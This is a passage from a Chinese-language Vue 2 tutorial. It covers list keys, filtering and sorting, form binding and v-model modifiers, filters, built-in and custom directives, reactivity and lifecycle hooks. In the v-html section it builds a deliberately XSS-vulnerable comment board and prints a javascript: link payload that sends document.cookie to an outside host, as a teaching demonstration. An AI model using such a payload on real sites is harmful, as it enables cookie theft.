在上面这个例子里，当你选中了第一个英雄麦格文的复选框，再按按钮添加麦文时，新添加的第一行英雄麦文的复选框被选中了，而现在第二行英雄麦格文的复选框没有被选中了。因为如果以 index 为 key 的话，使用头插法在数组中插入了元素，index 会改变，选中复选框后，真实的 DOM 会被修改，但是虚拟 DOM 没有修改，所以 diff 算法会将两个虚拟 DOM 进行比较，发现原来的第一行和新增的第一行只有 name 和 power 不一样，其他都是一样的，所以新增的第一行的复选框还是被选中状态。

那么怎么解决这个问题？建议使用对象的 id 作为 key

```html
<tr v-for="(hero,index) in heros"  :key="hero.id">
    <td>{{index+1}}</td>
    <td>{{hero.name}}</td>
    <td>{{hero.power}}</td>
    <td><input type="checkbox"></td>
</tr>
```

## 列表过滤

使用一个输入框，输入关键字，展示出包含关键字的数据。

使用 watch：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <input type="text" placeholder="请输入搜索关键字" v-model="keyword">
    <table>
        <tr>
            <th>序号</th>
            <th>英雄</th>
            <th>能量值</th>
            <th>选择</th>
        </tr>
        <tr v-for="(hero,index) in filteredHeros" :key="hero.id">
            <td>{{index+1}}</td>
            <td>{{hero.name}}</td>
            <td>{{hero.power}}</td>
            <td><input type="checkbox"></td>
        </tr>
    </table>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            keyword : '',
            msg : '列表过滤',
            heros : [
                {id:'101',name:'艾格文',power:10000},
                {id:'102',name:'麦迪文',power:9000},
                {id:'103',name:'古尔丹',power:8000},
                {id:'104',name:'萨尔',power:6000}
            ],
            filteredHeros : [],
        },
        watch : {
            keyword : {
                immediate : true,
                handler(val){
                    // filter不会破坏原数组的结构，会生成一个全新的数组。
                    this.filteredHeros = this.heros.filter((hero) => {
                        //return 过滤规则
                        return hero.name.indexOf(val) >= 0
                    })
                }
            }
        }
    })
</script>
```

![image-20240425145933201](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251459389.png)

使用计算属性：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <input type="text" placeholder="请输入搜索关键字" v-model="keyword">
    <table>
        <tr>
            <th>序号</th>
            <th>英雄</th>
            <th>能量值</th>
            <th>选择</th>
        </tr>
        <tr v-for="(hero,index) in filteredHeros" :key="hero.id">
            <td>{{index+1}}</td>
            <td>{{hero.name}}</td>
            <td>{{hero.power}}</td>
            <td><input type="checkbox"></td>
        </tr>
    </table>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            keyword : '',
            msg : '列表过滤',
            heros : [
                {id:'101',name:'艾格文',power:10000},
                {id:'102',name:'麦迪文',power:9000},
                {id:'103',name:'古尔丹',power:8000},
                {id:'104',name:'萨尔',power:6000}
            ]
        },
        computed : {
            filteredHeros(){
                // 执行过滤
                return this.heros.filter((hero) => {
                    return hero.name.indexOf(this.keyword) >= 0
                })
            }
        }
    })
</script>
```

使用计算属性就不需要单独将 filteredHeros 定义出来了。

## 列表排序

有三个按钮，升序、降序、原序，点击后会对现有数据按能量值进行排序。

会使用 js 数组的 sort 方法，sort 方法排序之后，不会生成一个新的数组，是在原数组的基础之上进行排序，会影响原数组的结构。

回顾 sort 的用法：

```js
let arr = [8,9,5,4,1,2,3]

arr.sort((a, b) => {
    return b - a  // 降序
    // return a - b  // 升序
})

console.log(arr)
```

三种顺序需要使用一个属性来区分，所以定义一个属性 type，升序是 1，降序是 2，原序是 0，通过按钮的点击事件给 type 赋值：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <input type="text" placeholder="请输入搜索关键字" v-model="keyword">
    <br>
    <button @click="type = 1">升序</button>
    <button @click="type = 2">降序</button>
    <button @click="type = 0">原序</button>
    <table>
        <tr>
            <th>序号</th>
            <th>英雄</th>
            <th>能量值</th>
            <th>选择</th>
        </tr>
        <tr v-for="(hero,index) in filteredHeros" :key="hero.id">
            <td>{{index+1}}</td>
            <td>{{hero.name}}</td>
            <td>{{hero.power}}</td>
            <td><input type="checkbox"></td>
        </tr>
    </table>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            type : 0,
            keyword : '',
            msg : '列表排序',
            heros : [
                {id:'101',name:'艾格文',power:10000},
                {id:'102',name:'麦迪文',power:9000},
                {id:'103',name:'古尔丹',power:8000},
                {id:'104',name:'萨尔',power:11000}
            ]
        },
        computed : {
            filteredHeros(){
                // 执行过滤
                const arr = this.heros.filter((hero) => {
                    return hero.name.indexOf(this.keyword) >= 0
                })
                // 排序
                if(this.type === 1){
                    arr.sort((a, b) => {
                        return a.power - b.power
                    })
                }else if(this.type == 2){
                    arr.sort((a, b) => {
                        return b.power - a.power
                    })
                }

                // 返回
                return arr
            }
        }
    })
</script>
```

![image-20240425151659845](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251517053.png)

## 表单数据的收集

假设要收集一个用户注册的信息，先画一个表单，每个表单元素通过 v-model 绑定一个属性，在 Vue 实例中定义出这些属性：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <form>
        用户名：<input type="text" v-model="user.username"><br><br>
        密码：<input type="password" v-model="user.password"><br><br>
        年龄：<input type="number" v-model="user.age"><br><br>
        性别：
        男<input type="radio" name="gender" value="1" v-model="user.gender">
        女<input type="radio" name="gender" value="0" v-model="user.gender"><br><br>
        爱好：
        旅游<input type="checkbox" v-model="user.interest" value="travel">
        运动<input type="checkbox" v-model="user.interest" value="sport">
        唱歌<input type="checkbox" v-model="user.interest" value="sing"><br><br>
        学历：
        <select v-model="user.grade">
            <option value="">请选择学历</option>
            <option value="zk">专科</option>
            <option value="bk">本科</option>
            <option value="ss">硕士</option>
        </select><br><br>
        简介：
        <textarea cols="50" rows="15" v-model="user.introduce"></textarea><br><br>
        <input type="checkbox" v-model="user.accept">阅读并接受协议<br><br>
        <button>注册</button>
    </form>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            user : {
                // 让数据有默认值，通过双向绑定就可以设置页面的默认选中
                username : '',
                password : '',
                age : '',
                gender : '',
                interest : [],
                grade : '',
                introduce : '',
                accept : ''
            },
            msg : '表单数据的收集'
        },
    })
</script>
```

此时打开 Vue 的开发者工具，可以看到：

![image-20240425193728849](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251937102.png)

### .number修饰符

此时，向年龄输入框中输入数据后，可以看到得到的是一个字符串：

![image-20240425193840846](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251938112.png)

那么如果想要 Vue 实例得到不是一个字符串，而是一个数字的话，可以使用 v-model 的修饰符 `.number`：

```html
年龄：<input type="number" v-model.number="user.age"><br><br>
```

此时得到的就是数字，而不是字符串：

![image-20240425194009714](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251940992.png)

如果输入框的 type 不是 number 的话，比如是 text 的话，也可以使用 `.number` 修饰符，也会将字符串转为数字，如果输入的内容不是纯数字，会只保留数字：

```html
年龄：<input type="text" v-model.number="user.age"><br><br>
```

![image-20240425194310141](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251943398.png)

但是只限于以数字开头，如果不是以数字开头的话，则不会转为数字，而是直接保存字符串：

![image-20240425194352675](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251943946.png)

### .trim修饰符

![image-20240425194731907](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251947147.png)

一般需要对用户输入的用户名等去除前后空白，可以使用 `.trim` 修饰符：

```html
用户名：<input type="text" v-model.trim="user.username"><br><br>
```

![image-20240425194755574](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251947814.png)

### .lazy修饰符

v-model 有一个 `.lazy` 修饰符，懒惰修饰符，当失去焦点后才会更新属性里的值。即数据不会立即同步到 Vue 实例的数据属性，而是等待特定事件触发后再同步。

默认情况下，v-model 会在每次输入事件（通常是 input 事件）时立即更新数据，但使用 lazy 修饰符后，它会等待 change 事件而不是 input 事件。

比如，在用户填写简介的时候，可以打开开发者工具查看，用户输入一个字符，Vue 实例中的属性就会实时更新一次，这是很耗资源的，可以使用 `.lazy` 修饰符，让文本域失去焦点后，才将用户输入的字符更新的 Vue 实例中：

```html
<textarea cols="50" rows="15" v-model.lazy="user.introduce"></textarea><br><br>
```

### radio如何收集数据的

v-model 一般绑定的是标签的 value 属性，一般将 value 省略了，写成：`v-model=""`，而输入框的 value 就是用户输入的内容，不需要程序员手动指定；但是单选框的 value 用户无法输入，所以需要手动指定出来，如果不指定 value 属性，那么直接使用 v-model 绑定 value 会获取到一个 null：

```html
性别：
男<input type="radio" name="gender" v-model="user.gender">
女<input type="radio" name="gender" v-model="user.gender"><br><br>
```

![image-20240425195134434](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251951674.png)

所以对于单选按钮来说，使用 v-model 绑定 value 的时候要手动加上 value 属性，因为单选按钮不像文本框，它没办法赋值：

```html
男<input type="radio" name="gender" value="1" v-model="user.gender">
女<input type="radio" name="gender" value="0" v-model="user.gender"><br><br>
```

![image-20240425195249813](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251952053.png)

### checkbox如何收集数据

checkbox 和 radio 一样，不能由用户输入值，如果没有指定 value 的话，使用 v-model 绑定 value 取到的值是这样的：

```html
爱好：
旅游<input type="checkbox" v-model="user.interest">
运动<input type="checkbox" v-model="user.interest">
唱歌<input type="checkbox" v-model="user.interest"><br><br>

<script>
    // 先将interest属性的值赋为空字符串
    const vm = new Vue({
        el: '#app',
        data: {
            user: {
                interest: '',
            },
            msg: '表单数据的收集'
        },
    })
</script>
```

当我选中一个复选框时，发现所有的复选框都被选中了，并且拿到的值是一个布尔值：

![image-20240425195831609](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251958847.png)

注意：对于 checkbox 来说，如果没有手动指定 value，那么会拿这个标签的 checked 属性的值作为 value

+ true：表示选中
+ false：表示未选中

所以也要手动指定 checkbox 的值：

```html
旅游<input type="checkbox" v-model="user.interest" value="travel">
运动<input type="checkbox" v-model="user.interest" value="sport">
唱歌<input type="checkbox" v-model="user.interest" value="sing"><br><br>
```

那为什么选中一个都会被选中？取消一个都会被取消？

这是因为 v-model 是双向绑定的，interest 的值绑定了三个复选框，所以一个复选框的状态变了，就会改变 interest 的值，然后就会影响其他两个复选框。

所以要将 interest 的类型改为一个数组来接收值：

```html
<script>
    // 先将interest属性的值赋为空字符串
    const vm = new Vue({
        el: '#app',
        data: {
            user: {
                interest: [],
            },
            msg: '表单数据的收集'
        },
    })
</script>
```

![image-20240425200505784](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404252005033.png)

### 默认值

比如，性别默认选择男，学历默认是本科，这些只需要修改 data 中的属性的初始值即可：

```json
data : {
    user : {
        // 让数据有默认值，通过双向绑定就可以设置页面的默认选中
        username : '',
        password : '',
        age : '',
        gender : '1',
        interest : ['travel'],
        grade : 'ss',
        introduce : '',
        accept : ''
    },
    msg : '表单数据的收集'
},
```

![image-20240425200827613](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404252008837.png)

### 提交表单

在表单中有一个 button，当前点击这个 button 后，就会自动提交表单，这时因为表单有默认的提交事件。而现在大部分时候都是使用 ajax 进行提交表单，所以需要阻止默认的表单提交事件。

可以使用 button 的点击事件的修饰符来阻止：

```html
<button @click.prevent="send">注册</button>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            user : {
            },
            msg : '表单数据的收集'
        },
        methods : {
            send(){
                alert('ajax...!!!!')
            }
        }
    })
</script>
```

还可以通过表单的事件来阻止：

```html
<form @submit.prevent="send">
    <button>注册</button>
</form>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            user : {
            },
            msg : '表单数据的收集'
        },
        methods : {
            send(){
                alert('ajax...!!!!')
            }
        }
    })
</script>
```

submit 事件是表单的提交事件，提交表单时会触发 send 函数。

提交表单时需要将收集的数据转为一个 json 字符串，使用 JSON.stringfy()：

```js
methods : {
    send(){
        alert('ajax...!!!!')
        console.log(JSON.stringify(this.user))
    }
}
```

## 过滤器

过滤器 filters 适用于简单的逻辑处理，例如：对一些数据进行格式化显示。

他的功能完全可以使用 methods，computed 来实现。过滤器可以进行全局配置，也可以进行局部配置：

①　全局配置：在构建任何 Vue 实例之前使用 `Vue.filter(‘过滤器名称’, callback) `进行配置。

②　局部配置：在构建 Vue 实例的配置项中使用 `filters` 进行局部配置。

过滤器可以用在两个地方：插值语法和 v-bind 指令中。

多个过滤器可以串联：`{{msg | filterA | filterB | filterC}}`

过滤器也可以接收额外的参数，但过滤器的第一个参数永远接收的都是前一个过滤器的返回值。

现有一个情景：从服务器端返回了一个商品的价格 price，这个 price 的值可能是这几种情况：`''`、`null`、`undefined`、`60.5`

要求：

+ 如果是 `''`、`null`、`undefined `，页面上统一显示为 `-` 
+ 如果不是 ''、null、undefined，则页面上显示真实的数字即可。 

使用计算属性和 methods 实现：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <h2>商品价格：{{formatPrice}}</h2>
    <h2>商品价格：{{formatPrice2()}}</h2>
</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '过滤器',
            price : 50.6
        },
        methods: {
            formatPrice2(){
                if(this.price === '' || this.price === undefined || this.price === null){
                    return '-'
                }
                return this.price
            }
        },
        computed : {
            formatPrice(){
                if(this.price === '' || this.price === undefined || this.price === null){
                    return '-'
                }
                return this.price
            }
        },
    })
</script>
```

使用过滤器的形式完成：

现在 Vue 实例中定义一个 filters 配置项，里面定义一个方法：

```html
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '过滤器',
            price : 50.6
        },
       	filters : {
            filterA(val){
                if(val === null || val === undefined || val === ''){
                    return '-'
                }
                return val
            },
        }
    })
</script>
```

然后通过管道使用过滤器：

```html
<h2>商品价格：{{price | filterA}}</h2>
```

+ `|` 就是管道符号，将 price 这个值通过管道传给 filterA 方法，filterA 方法的参数就是这个传过来的值
+ 过滤器都要有一个返回值，这个返回值就会过滤器的结果

过滤器也可以串联：

```html
<h2>商品价格：{{price | filterA | filterB}}</h2>
```

+ 将 price 传给 filterA 过滤器，然后将 filterA 的返回结果传给 filterB 过滤器，最终将 filterB 过滤器的值渲染出来

过滤器可以接收多个参数：

```html
<h2>商品价格：{{price | filterA | filterB(3)}}</h2>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '过滤器',
            price : 50.6
        },
       	filters : {
            filterA(val){
                if(val === null || val === undefined || val === ''){
                    return '-'
                }
                return val
            },
            filterB(val, number){
                return val.toFixed(number)
            }
        }
    })
</script>
```

+ 过滤器的第一个参数不用手写，永远接收的都是前一个过滤器的返回值。
+ toFixed() 是 JavaScript 中用于格式化数字的方法。它可用于将浮点数或整数转换为一个指定小数位数的字符串，以便显示或输出。

过滤器可以用在两个地方：插值语法和 v-bind 指令中：

```html
<input type="text" :value="price | filterA | filterB(3)">
```

以上用到的都是局部过滤器，局部过滤器在另一个容器中无法使用，还有全局过滤器：

配置全局过滤器：

```js
Vue.filter('过滤器名称', 回调函数)
```

比如：

```js
Vue.filter('filterA', function(val){
    if(val === null || val === undefined || val === ''){
        return '-'
    }
    return val
})
```

全局过滤器在每个容器中都可以使用。

## Vue的其他指令

### v-text

可以将指令的内容拿出来填充到标签体当中。和 JS 的 innerText 一样。

```html
<h1 v-text="msg"></h1>
```

这种填充是以覆盖的形式进行的。先清空标签体当中原有的内容，填充新的内容。

```html
<h1 v-text="msg">test</h1>
```

即使内容是一段 HTML 代码，这种方式也不会将 HTML 代码解析并执行。只会当做普通文本来处理。

### v-html

和 v-text 一样，也是填充标签体内容。也是采用覆盖的形式进行。只不过 v-html 会将内容当做一段 HTML 代码解析并执行。

```html
<h1 v-html="<h1>欢迎大家学习Vue！</h1>"></h1>
```

和 js 中的 innerHtml 效果一样，少用，尽量不要用在用户提交的内容上，可能导致 xss 攻击。

实现一个留言板，使用 v-html 演示一下 xss 攻击:

```html
<div id="app">
    <ul>
        <li v-for="m,index of list" v-html="m"></li>
    </ul>
    <textarea cols="80" rows="10" v-model.lazy="text"></textarea>
    <br>
    <button @click="add()">提交评论</button>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            list : [],
            text : ''
        },
        methods : {
            add() {
                this.list.push(this.text);
            }
        }
    })
</script>
```

![image-20240426201100643](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262011862.png)

由于使用了 v-html 指令，所以输入一段 html 代码后，会被渲染：

![image-20240426201251395](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262012559.png)

这种情况下就会有危险。在浏览器中手动设置两个 Cookie：

![image-20240426201624534](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262016701.png)

然后在文本域中输入以下代码：

```html
<a href="javascript:location.href='http://www.baidu.com?'+document.cookie">点我看点好看的</a>
```

+ `javascript:` ：表示后面是一段 js 代码
+ `document.cookie` ：获取到本地的 cookie

![image-20240426201838107](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262018271.png)

当用户点击后，就会将本地的 cookie 数据拿到手了：

![image-20240426201901206](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262019364.png)

v-html 和 v-text 一般不用，一般使用插值语法即可。

### v-cloak

v-cloak 是一个用于解决闪现问题的特殊指令，使用 v-cloak 可以确保 Vue.js 将模板渲染完成后再显示元素。

```html
<!--这一段div是模板语句-->
<div id="app">
    <h1 v-cloak>{{msg}}</h1>
</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Vue的其它指令'
        }
    })
</script>
```

模板语句是在页面加载 Vue.js 后，执行了创建 Vue 实例代码后，才开始编译的，如果在这个期间， Vue.js 加载的很慢，那么这个模板语句就会一直显示 `{{msg}}` 在页面上，直到加载完成。

比如使用 setTimeOut 模拟延迟：

```html
<div id="app">
    <h1 v-cloak>{{msg}}</h1>
</div>

<script>
    // 模拟 vue.js 晚加载
    setTimeout(() => {
        let scriptElt = document.createElement('script')
        scriptElt.src = '../js/vue.js'
        document.head.append(scriptElt)
    }, 3000)

    // 模拟下面代码晚执行
    setTimeout(() => {
        const vm = new Vue({
            el : '#app',
            data : {
                msg : 'Vue的其它指令'
            }
        })
    }, 4000)
</script>
```

在前 4 秒是：

![image-20240426202654884](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262026044.png)

然后就会突然编成：

![image-20240426202718020](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262027178.png)

这就是胡子语法的"闪现问题"，通常是因为数据在初始加载时尚未完全加载，导致模板中的 {{}} 表达式最初显示为未解析的占位符，然后在数据加载后才显示真实内容。

v-cloak 通常与 CSS 配合使用，可以防止未解析的 {{}} 表达式在页面加载时闪现

```html
<style>
    [v-cloak] {
        display: none;
    }
</style>

<div id="app">
    <h1 v-cloak>{{msg}}</h1>
</div>
```

将带有 v-cloak 属性的所有元素都隐藏起来，当 Vue 编译完后，会将 v-cloak 属性删掉，这时元素就会显示出来。

### v-once

只渲染一次，之后将被视为静态内容。

可以使用两个 v-for 来演示：

```html
<div id="app">
    <ul>
        <li v-for="user,index of users" :key="index" v-once>
            {{user}}
        </li>
    </ul>

    <ul>
        <li v-for="user,index of users" :key="index">
            {{user}}
        </li>
    </ul>
</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Vue的其它指令',
            users : ['jack', 'lucy', 'james']
        }
    })
</script>
```

初始是：

![image-20240426203412012](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262034181.png)

打开 Vue 开发者工具后，修改一个值，会发现只有下面的列表变化了，使用 v-once 修饰的列表没有重新渲染：

![image-20240426203452975](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262034163.png)

### v-pre

v-pre 可以提高编译速度，带有该指令的标签不会被编译，可以在没有 Vue 语法规则的标签中使用

```html
<h1 v-pre>欢迎学习Vue框架！</h1>
<h1 v-pre>{{msg}}</h1>
```

![image-20240426203643260](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262036433.png)

## 自定义指令

自定义指令需要在 directives 配置项中。

v-text 指令可以将内容放在标签体中，现在有要求使用 v-text-danger 指令将内容以红色的字体显示，这个 v-text-danger 指令就需要自定义：

```js
const vm = new Vue({
    el: '#app',
    data: {
        msg : '自定义指令',
    },
    directives: {
        // 指令1
        // 指令2……
        'text-danger' : function(element, binding){
            console.log('@')
            element.innerText = binding.value
            element.style.color = 'red'
        },
    }
})
```

关于自定义指令的名字：

+ `v- `不需要写
+ Vue 官方建议指令的名字要全部小写。如果是多个单词的话，请使用 `-` 进行衔接。

这个回调函数的执行时机包括两个:

+ 标签和指令第一次绑定的时候。
+ 模板被重新解析的时候（ Data 发生改变的时候）。

这个回调函数有两个参数：

```html
<div id="app">
    <div v-text-danger="msg"></div>
</div>

<script>
    const vm = new Vue({
        el: '#app',
        data: {
            msg: '自定义指令',
        },
        directives: {
            'text-danger': function (element, binding) {
                console.log(element)
                console.log(binding)
            },
        }
    })
</script>
```

![image-20240426204918908](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262049096.png)

+ 第一个参数是真实的 dom 元素。 
+ 第二个参数是标签与指令之间绑定关系的对象。
  + 这个对象的 value 就是绑定的值

现在需要一个指令，可以和v-bind指令完成相同的功能，同时将该元素的父级元素的背景色设置为蓝色

```html
<div>
    用户名：<input type="text" v-bind-blue="username">
</div>

<script>
    const vm = new Vue({
        el: '#app',
        data: {
            msg: '自定义指令',
            username : 'jackson'
        },
        directives: {
            'bind-blue' : function(element, binding){
                element.value = binding.value
                element.parentNode.style.backgroundColor = 'blue'
            } 
        }
    })
</script>
```

这样有个报错：

![image-20240426205516263](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404262055472.png)

因为 element.parentNode 是一个 null。为什么是null？

原因是这个函数在执行的时候，指令和元素完成了绑定，但是只是在内存当中完成了绑定，元素还没有被插入到页面当中。

要解决这个问腿，一般定义指令时使用对象式定义即可。以上方法式函数式指令。

```json
'bind-blue' : {
    // 元素与指令初次绑定的时候，自动调用bind
    bind(element, binding){
        element.value = binding.value
    },
    // 元素被插入到页面之后，这个函数自动被调用。
    inserted(element, binding){
        element.parentNode.style.backgroundColor = 'blue'
    },
    // 当模板重新解析的时候，这个函数会被自动调用。
    update(element, binding){
        element.value = binding.value
    }
} 
```

+ 这个指令对象中三个方法的名字不能随便写。
+ 这个指令中的三个函数都会被自动调用，注意：在特定的时间节点调用特定的函数，这种被调用的函数称为钩子函数。

还有全局指令，像以上定义的指令都是局部指令，不能在另一个容器中使用。

定义全局指令，要在创建所有 Vue 实例之前定义：

```js
// 函数式
Vue.directive('text-danger', function(element, binding){
    console.log(this)
    element.innerText = binding.value
    element.style.color = 'red'
})

// 对象式
Vue.directive('bind-blue', {
    bind(element, binding){
        element.value = binding.value
        console.log(this)
    },
    inserted(element, binding){
        element.parentNode.style.backgroundColor = 'skyblue'
        console.log(this)
    },
    update(element, binding){
        element.value = binding.value
        console.log(this)
    }
})
```

**对于自定义指令来说，函数体当中的this是window，而不是vue实例。**

## 响应式与数据劫持

**什么是响应式？**

修改 data 后，页面自动改变/刷新。这就是响应式。就像我们在使用 excel 的时候，修改一个单元格中的数据，其它单元格的数据会联动更新，这也是响应式。

响应式的实现用到了数据劫持。

**什么是数据劫持？**

数据代理对应的 getter ；数据劫持对应的 setter。

Vue 底层使用了 Object.defineProperty，配置了 setter 方法，当去修改属性值时 setter 方法则被自动调用，setter 方法中不仅修改了属性值，而且还做了其他的事情，例如：重新渲染页面。修改属性值的时候，会先走到 setter 方法这来，setter 方法就像半路劫持一样，所以称为数据劫持。

打开之前自己的 myvue.js：

```js
class Vue {
    constructor(options) {
        Object.keys(options.data).forEach((propertyName, index) => {
            let c = propertyName.charAt(0);
            if (c != '_' && c != '$') {
                Object.defineProperty(this, propertyName, {
                    // 数据代理
                    get() {
                        return options.data[propertyName];
                    },
                    // 数据劫持
                    set(val) {
                        options.data[propertyName] = val;
                    }
                })
            }
        });
        Object.keys(options.methods).forEach((methodName, index) => {
            this[methodName] = options.methods[methodName];
        });
    }
}
```

数据劫持主要做两个事：

+ 修改内存中该对象的属性值
+ 重新渲染页面

**哪些数据做了数据劫持？**

在 Vue 实例中，属性后面是三个点且提供了对应的 getter 和 setter 的就是做了数据劫持的。

![image-20240427093555615](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404270935823.png)

**Vue会给data中所有的属性，以及属性中的属性，都会添加响应式。**

```js
const vm = new Vue({
    el : '#app',
    data : {
        msg : '响应式与数据劫持',
        name : 'jackson',
        age : 20,
        a : {
            b : {
                c : {
                    e : 1
                }
            }
        }
    }
})
```

这个属性 a 以及 a 中的属性都会做数据劫持。

**后期添加的属性，不会有响应式**

```js
vm.$data.a.email = 'jack@126.com'
```

![image-20240427093937773](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404270939959.png)

发现并没有做响应式处理。

如果你想给后期追加的属性添加响应式处理的话，调用以下两个方法都可以：

+ Vue.set() 、 
+ vm.$set()

这两方法的语法格式、效果都是一样的：

```js
Vue.set(目标对象, 属性名, 属性值)
```

所以以上代码这样写：

```js
Vue.set(vm.$data.a, 'email', 'jack@126.com')
```

![image-20240427141157611](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271412653.png)

或者这样写，省略掉 $data：

```js
Vue.set(vm.a, 'email', 'jack@123.com')
```

避免在运行时向 Vue 实例或其根 $data 添加响应式，不能直接给 vm / vm.\$data 追加响应式属性。只能在声明时提前定义好。

```js
Vue.set(vm, 'x', '1')
Vue.set(vm.$data, 'x', '1')
```

![image-20240427141603177](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271416342.png)

## 数组的响应式处理

**通过数组下标 0、1、2 去访问数组元素，会有响应式处理吗？**

通过数组的下标去修改数组中的元素，默认情况下是没有添加响应式处理的。

```html
<div id="app">
    <h1>{{msg}}</h1>
    <ul>
        <li v-for="user in users">
            {{user}}
        </li>
    </ul>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '数组的响应式处理',
            users : ['jack', 'lucy', 'james'],
        }
    })
</script>
```

这个 users 本身是有响应式处理的：

![image-20240427144707749](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271447921.png)

但是通过下标访问数组中的元素是没有做响应式的：

![image-20240427144809487](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271448655.png)

也可以通过下标修改一个值，发现页面上的值并没有发生改变：

![image-20240427144908607](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271449777.png)

假设数组中每个元素是一个对象，这每个对象中的属性都是有响应式处理的：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <ul>
        <li v-for="user in users">
            {{user}}
        </li>
    </ul>
    <ul>
        <li v-for="vip in vips" :key="vip.id">
            {{vip.name}}
        </li>
    </ul>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '数组的响应式处理',
            users : ['jack', 'lucy', 'james'],
            vips : [
                {id:'111', name:'zhangsan'},
                {id:'222', name:'lisi'}
            ]
        }
    })
</script>
```

![image-20240427145357362](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271453550.png)

如果想通过下标修改数组中的元素时也有响应式的话，可以使用：

+ `vm.$set(数组对象, 下标, 值)`
+ `Vue.set(数组对象, 下标, 值)`

或者通过以下的 7 个方法来给数组添加响应式处理

+ push()
+ pop()      
+ reverse()
+ splice()
+ sunshift()
+ sort()

## Vue的生命周期

所谓的生命周期是指：一个事物从出生到最终的死亡，整个经历的过程叫做生命周期。

Vue 的生命周期指的是：vm 对象从创建到最终销毁的整个过程。

![image-20240427154139820](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271541051.png)

### 钩子函数

在生命周期中，有很多个时间节点，每个时间节点就会做不同的事，比如：

+ (1) 虚拟 DOM 在内存中就绪时：去调用一个 a 函数
+ (2) 虚拟 DOM 转换成真实 DOM 渲染到页面时：去调用一个 b 函数
+ (3) Vue 的 data 发生改变时：去调用一个 c 函数
+ (4) ......
+ (5) Vue 实例被销毁时：去调用一个 x 函数

这些时间点中调用的函数叫做钩子函数，这些函数是不需要程序员手动调用的，由 Vue 自动调用，程序员只需要按照自己的需求写上，到了那个时间点自动就会执行。

研究 Vue 的生命周期的核心就是研究：**在哪个时间点调用了哪个钩子函数。**

### 4个阶段8个钩子

Vue 的生命周期可以被划分为 4 个阶段：

+ 初始阶段：生成虚拟 dom
+ 挂载阶段：把虚拟 dom 放到页面中，生成了真实 dom，页面渲染了
+ 更新阶段：data 发生了变化，页面会重新渲染
+ 销毁阶段：销毁 Vue 实例

每个阶段会调用两个钩子函数。两个钩子函数名的特点：beforeXxx()、xxxed()

+ 初始阶段
  + beforeCreate() 创建前
  + created() 创建后
+ 挂载阶段
  + beforeMount() 挂载前
  + mounted() 挂载后
+ 更新阶段
  + beforeUpdate() 更新前
  + updated() 更新后
+ 销毁阶段
  + beforeDestroy() 销毁前
  + destroyed() 销毁后

**8个钩子函数写在哪里？**直接写在 Vue 构造函数的 options 对象当中。

```js
const vm = new Vue({
    el : '#app',
    data : {
        msg : 'Vue生命周期',
    },
    // 1.创建阶段
    beforeCreate() {
        // 创建前
        console.log('beforeCreate')
    },
    created() {
        // 创建后
        console.log('created')
    },
    // 2.挂载阶段
    beforeMount() {
        // 挂载前
        console.log('beforeMount')
    },
    mounted() {
        // 挂载后
        console.log('mounted')
    },
    // 3.更新阶段
    beforeUpdate() {
        // 更新前
        console.log('beforeUpdate')
    },
    updated() {
        // 更新后
        console.log('updated')
    },
    // 4.销毁阶段
    beforeDestroy() {
        // 销毁前
        console.log('beforeDestroy')
    },
    destroyed() {
        // 销毁后
        console.log('destroyed')
    },
})
```

此时直接打开页面，观察控制台：

![image-20240427152911860](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271529036.png)

这表明前两个阶段已经执行了。

更新阶段必须要在 data 数据中改变时，所以准备一个变量 counter，使用一个按钮，点击一次 counter 加 1：

```html
<div id="app">
    <h1>{{msg}}</h1>
